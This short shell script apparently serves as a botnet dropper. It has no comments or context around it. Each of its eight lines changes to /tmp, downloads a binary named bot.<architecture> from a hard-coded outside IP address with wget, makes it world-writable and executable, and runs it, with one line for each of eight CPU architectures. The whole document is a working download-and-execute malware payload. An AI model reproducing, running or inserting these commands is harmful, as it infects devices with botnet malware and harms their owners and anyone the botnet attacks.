cd /tmp && wget http://45.95.55.214/multi/bot.mips && chmod 777 bot.mips && ./bot.mips $1
cd /tmp && wget http://45.95.55.214/multi/bot.arm7 && chmod 777 bot.arm7 && ./bot.arm7 $1
cd /tmp && wget http://45.95.55.214/multi/bot.mipsel && chmod 777 bot.mipsel && ./bot.mipsel $1
cd /tmp && wget http://45.95.55.214/multi/bot.powerpc && chmod 777 bot.powerpc && ./bot.powerpc $1
cd /tmp && wget http://45.95.55.214/multi/bot.sh4 && chmod 777 bot.sh4 && ./bot.sh4 $1
cd /tmp && wget http://45.95.55.214/multi/bot.m68k && chmod 777 bot.m68k && ./bot.m68k $1
cd /tmp && wget http://45.95.55.214/multi/bot.x86 && chmod 777 bot.x86 && ./bot.x86 $1
cd /tmp && wget http://45.95.55.214/multi/bot.x86_64 && chmod 777 bot.x86_64 && ./bot.x86_64 $1